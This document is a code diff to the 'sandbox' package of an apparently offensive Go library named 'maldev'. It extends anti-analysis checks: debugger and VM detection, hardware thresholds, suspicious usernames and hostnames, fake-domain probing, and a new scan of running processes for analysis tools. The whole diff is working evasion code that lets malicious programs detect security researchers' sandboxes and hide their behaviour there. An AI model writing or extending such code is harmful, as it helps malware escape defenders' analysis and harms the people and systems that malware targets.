@@ -3,19 +3,21 @@
 package sandbox
 
 import (
+	"context"
+	"fmt"
 	"net/http"
 	"net/url"
 	"os"
 	"os/user"
 	"runtime"
 	"strings"
-	"time"
 	"unsafe"
 
-	"github.com/oioio-space/maldev/win/api"
 	"github.com/oioio-space/maldev/evasion/antidebug"
 	"github.com/oioio-space/maldev/evasion/antivm"
 	"github.com/oioio-space/maldev/evasion/timing"
+	"github.com/oioio-space/maldev/process/enum"
+	"github.com/oioio-space/maldev/win/api"
 	"golang.org/x/sys/windows"
 )
 
@@ -26,11 +28,8 @@ type Checker struct {
 	cfg Config
 }
 
-// NewChecker returns a Checker configured with cfg.
-func NewChecker(cfg Config) *Checker { return &Checker{cfg: cfg} }
-
-// NewCheckerDefault returns a Checker with DefaultConfig.
-func NewCheckerDefault() *Checker { return NewChecker(DefaultConfig()) }
+// New returns a Checker configured with cfg.
+func New(cfg Config) *Checker { return &Checker{cfg: cfg} }
 
 // IsDebuggerPresent returns true if the process is being debugged.
 func (c *Checker) IsDebuggerPresent() bool { return antidebug.IsDebuggerPresent() }
@@ -80,9 +79,13 @@ func DiskFreeBytes(p string) (uint64, error) {
 	return total, nil
 }
 
-// HasEnoughDisk returns true if the system drive meets the configured minimum.
+// HasEnoughDisk returns true if the configured disk path meets the minimum size.
 func (c *Checker) HasEnoughDisk() (bool, error) {
-	total, err := DiskFreeBytes(`C:\`)
+	path := c.cfg.DiskPath
+	if path == "" {
+		path = `C:\`
+	}
+	total, err := DiskFreeBytes(path)
 	if err != nil {
 		return false, err
 	}
@@ -125,9 +128,30 @@ func (c *Checker) BadHostname() (bool, string, error) {
 	return false, "", nil
 }
 
+// CheckProcesses returns true if any running process matches the configured bad process names.
+// Uses case-insensitive substring matching against c.cfg.BadProcesses.
+func (c *Checker) CheckProcesses(ctx context.Context) (bool, string, error) {
+	procs, err := enum.List()
+	if err != nil {
+		return false, "", err
+	}
+	for _, p := range procs {
+		if ctx.Err() != nil {
+			return false, "", ctx.Err()
+		}
+		lower := strings.ToLower(p.Name)
+		for _, bad := range c.cfg.BadProcesses {
+			if strings.Contains(lower, strings.ToLower(bad)) {
+				return true, p.Name, nil
+			}
+		}
+	}
+	return false, "", nil
+}
+
 // FakeDomainReachable returns true if cfg.FakeDomain responds to HTTP GET,
 // which is characteristic of sandbox network interception.
-func (c *Checker) FakeDomainReachable() (bool, int, error) {
+func (c *Checker) FakeDomainReachable(ctx context.Context) (bool, int, error) {
 	if c.cfg.FakeDomain == "" {
 		return false, 0, nil
 	}
@@ -139,7 +163,7 @@ func (c *Checker) FakeDomainReachable() (bool, int, error) {
 	if err != nil {
 		return false, 0, err
 	}
-	req, err := http.NewRequest("GET", u.String(), nil)
+	req, err := http.NewRequestWithContext(ctx, "GET", u.String(), nil)
 	if err != nil {
 		return false, 0, err
 	}
@@ -147,18 +171,119 @@ func (c *Checker) FakeDomainReachable() (bool, int, error) {
 	if ua != nil {
 		req.Header.Set("User-Agent", ua.String())
 	}
-	client := &http.Client{Timeout: 5 * time.Second}
+	timeout := c.cfg.RequestTimeout
+	if timeout == 0 {
+		timeout = 5 * 1e9 // 5s fallback
+	}
+	client := &http.Client{Timeout: timeout}
 	resp, err := client.Do(req)
 	if err != nil {
-		return false, 0, nil // unreachable — expected for a fake domain
+		return false, 0, nil // unreachable -- expected for a fake domain
 	}
 	defer resp.Body.Close()
 	return true, resp.StatusCode, nil
 }
 
-// IsSandboxed runs all configured checks and returns true on the first indicator found.
-// The returned string describes which check triggered.
-func (c *Checker) IsSandboxed() (bool, string, error) {
+// CheckAll runs every detection check and returns a Result for each.
+func (c *Checker) CheckAll(ctx context.Context) []Result {
+	var results []Result
+
+	results = append(results, Result{
+		Name:     "debugger",
+		Detected: c.IsDebuggerPresent(),
+		Detail:   "debugger attached to process",
+	})
+
+	results = append(results, Result{
+		Name:     "vm",
+		Detected: c.IsRunningInVM(),
+		Detail:   "hypervisor indicators found",
+	})
+
+	cpuOK := c.HasEnoughCPU()
+	results = append(results, Result{
+		Name:     "cpu",
+		Detected: !cpuOK,
+		Detail:   fmt.Sprintf("CPU cores: %d, minimum: %d", runtime.NumCPU(), c.cfg.MinCPUCores),
+	})
+
+	ramOK, ramErr := c.HasEnoughRAM()
+	results = append(results, Result{
+		Name:     "ram",
+		Detected: ramErr == nil && !ramOK,
+		Detail:   fmt.Sprintf("minimum RAM: %dGB", int(c.cfg.MinRAMGB)),
+		Err:      ramErr,
+	})
+
+	diskOK, diskErr := c.HasEnoughDisk()
+	results = append(results, Result{
+		Name:     "disk",
+		Detected: diskErr == nil && !diskOK,
+		Detail:   fmt.Sprintf("minimum disk: %dGB on %s", int(c.cfg.MinDiskGB), c.cfg.DiskPath),
+		Err:      diskErr,
+	})
+
+	badUser, userName, userErr := c.BadUsername()
+	results = append(results, Result{
+		Name:     "username",
+		Detected: userErr == nil && badUser,
+		Detail:   "suspicious username: " + userName,
+		Err:      userErr,
+	})
+
+	badHost, hostName, hostErr := c.BadHostname()
+	results = append(results, Result{
+		Name:     "hostname",
+		Detected: hostErr == nil && badHost,
+		Detail:   "suspicious hostname: " + hostName,
+		Err:      hostErr,
+	})
+
+	domainReachable, statusCode, domainErr := c.FakeDomainReachable(ctx)
+	detail := "fake domain unreachable (expected)"
+	if domainReachable {
+		detail = fmt.Sprintf("fake domain reachable, status %d", statusCode)
+	}
+	results = append(results, Result{
+		Name:     "domain",
+		Detected: domainErr == nil && domainReachable,
+		Detail:   detail,
+		Err:      domainErr,
+	})
+
+	procFound, procName, procErr := c.CheckProcesses(ctx)
+	results = append(results, Result{
+		Name:     "process",
+		Detected: procErr == nil && procFound,
+		Detail:   "analysis tool detected: " + procName,
+		Err:      procErr,
+	})
+
+	return results
+}
+
+// IsSandboxed runs all configured checks and returns true if any indicator is found.
+// When StopOnFirst is true (default), it returns on the first detection.
+// When StopOnFirst is false, it runs all checks and returns a combined summary.
+func (c *Checker) IsSandboxed(ctx context.Context) (bool, string, error) {
+	if c.cfg.StopOnFirst {
+		return c.isSandboxedStopOnFirst(ctx)
+	}
+
+	results := c.CheckAll(ctx)
+	var reasons []string
+	for _, r := range results {
+		if r.Detected {
+			reasons = append(reasons, r.Detail)
+		}
+	}
+	if len(reasons) > 0 {
+		return true, strings.Join(reasons, "; "), nil
+	}
+	return false, "", nil
+}
+
+func (c *Checker) isSandboxedStopOnFirst(ctx context.Context) (bool, string, error) {
 	if c.IsDebuggerPresent() {
 		return true, "debugger detected", nil
 	}
@@ -180,8 +305,11 @@ func (c *Checker) IsSandboxed() (bool, string, error) {
 	if found, name, err := c.BadHostname(); err == nil && found {
 		return true, "suspicious hostname: " + name, nil
 	}
-	if found, _, err := c.FakeDomainReachable(); err == nil && found {
+	if found, _, err := c.FakeDomainReachable(ctx); err == nil && found {
 		return true, "fake domain reachable (sandbox DNS)", nil
+	}
+	if found, name, err := c.CheckProcesses(ctx); err == nil && found {
+		return true, "analysis tool detected: " + name, nil
 	}
 	return false, "", nil
 }
